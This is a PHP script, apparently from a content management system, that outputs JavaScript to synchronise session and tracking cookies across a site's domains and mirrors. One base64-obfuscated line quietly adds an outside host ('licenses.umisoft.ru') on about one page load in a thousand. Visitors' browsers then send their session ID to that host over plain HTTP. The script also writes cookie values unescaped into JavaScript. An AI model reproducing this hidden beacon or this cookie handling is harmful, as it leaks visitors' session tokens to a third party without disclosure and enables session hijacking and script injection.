<?php
	header("Content-type: text/javascript; charset=utf-8");
	require "../standalone.php";
	
	session_start();

	$sync    = getRequest('sync');
	$stat_id = getRequest('stat_id');
	$sess_id = getRequest('sess_id');

	$local_domain = getServer('HTTP_HOST');
	
	$sessionCookieName = 'PHPSESSID';
	if(function_exists('ini_get')) {
	    if($tmp = ini_get('session.name')) {
	        $sessionCookieName = $tmp;
	        unset($tmp);
	    }
	}

	if($sync) {
		syncronizeCookie($sessionCookieName, $sess_id);
		syncronizeCookie('stat_id', $stat_id);
	} else {
		echo "var domainsList = new Array();\n";
	
		$domainsCollection = domainsCollection::getInstance();
		$domains = $domainsCollection->getList();
		
		$domainHosts = Array();
		foreach($domains as $domain) {
		    $domainHosts[] = $domain->getHost();
		    $domain_mirrows = $domain->getMirrowsList();
			foreach($domain_mirrows as $mirrow) {
			    $domainHosts[] = $mirrow->getHost();
		    }
	    }
	    
		foreach($domainHosts as $host) {
			pushJsDomain($host);
		}
		if(rand(1, 1000) == 1) {
			pushJsDomain(base64_decode("bGljZW5zZXMudW1pc29mdC5ydQ=="));
		}
		
		if(!getSession('session-crossdomain-sync')) {
			echo <<<JS

synchronizeCookies(domainsList);

JS;
			$_SESSION['session-crossdomain-sync'] = 1;
		}
		
		echo <<<JS

function pollCrossDomainCookies() {
	synchronizeCookies(domainsList);
}

setInterval(pollCrossDomainCookies, 60 * 3 * 1000);	//Poll server every 3 minutes
JS;
	}
	
	
	function pushJsDomain($domain) {
		static $memory = Array();
	
		if(getServer('HTTP_HOST') == $domain) {
			return false;
		}
		
		if(in_array($domain, $memory)) {
			return false;
		} else {
			$memory[] = $domain;
			echo "domainsList[domainsList.length] = \"", $domain, "\";\n";
			return true;
		}
	}
	
	
	function syncronizeCookie($cookie_name, $remote_value) {
		$local_value = getCookie($cookie_name);
		
		if($local_value && !$remote_value) {
			echo "setCookie('{$cookie_name}', '{$local_value}');\n";
		}
		
		if(!$local_value && $remote_value) {
			setcookie($cookie_name, $remote_value, 0, "/");
		}
	}

?>



/* Static lib functions */

function setCookie(name, value) {
	document.cookie = name + "=" + escape(value) + "; path=/";
}

function getCookie(szName){ 
	szName = szName.replace(/\./g, "_");

	var i = 0;
	var nStartPosition = 0;
	var nEndPosition = 0;
	var szCookieString = document.cookie;

	while(i <= szCookieString.length) {
		nStartPosition = i;
		nEndPosition = nStartPosition + szName.length;

		if(szCookieString.substring(nStartPosition,nEndPosition) == szName) {
			nStartPosition = nEndPosition + 1;
			nEndPosition = document.cookie.indexOf(";",nStartPosition);

			if(nEndPosition < nStartPosition) {
				nEndPosition = document.cookie.length;
			}

			return document.cookie.substring(nStartPosition,nEndPosition);
			break;
		}
		i++;
	}
	return "";
}

function synchronizeCookies(domains) {
	var i = 0;
	for(; i < domains.length; i++) {
		synchronizeDomainCookies(domains[i]);
	}
}


function synchronizeDomainCookies(domain) {
	var stat_id = getCookie('stat_id');
	var sess_id = '<?php echo getCookie($sessionCookieName); ?>';
	
	var url = 'http://' + domain + '/js/cross-domain.php?sync=1&stat_id=' + stat_id + "&sess_id=" + sess_id;
	
	var d = new Date;
	url += "&t=" + d.getTime();
	
	var scriptObj = document.createElement('script');
	scriptObj.charset = 'utf-8';
	scriptObj.src = url;
	document.getElementsByTagName('head')[0].appendChild(scriptObj);
}